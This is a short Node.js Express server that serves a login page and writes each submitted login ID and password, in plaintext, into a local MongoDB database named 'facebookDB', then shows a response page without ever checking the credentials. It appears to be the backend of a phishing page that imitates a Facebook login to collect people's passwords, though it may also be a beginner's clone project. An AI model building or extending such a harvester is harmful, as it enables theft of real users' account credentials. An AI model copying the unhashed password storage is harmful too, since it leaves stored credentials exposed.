const express = require("express");
const mongoose = require("mongoose");
const userData = require("./Database/db");
const bodyParser = require("body-parser");

mongoose.connect("mongodb://localhost:27017/facebookDB");

const app = express();
const PORT = 3000;

// Middleware to parse incoming form data
app.use(bodyParser.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.sendFile("index.html", { root: __dirname });
});

app.post("/", async (req, res) => {
  await userData.create({
    id: req.body.loginId,
    password: req.body.loginPaws,
  });
  res.sendFile("response.html", { root: __dirname });
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
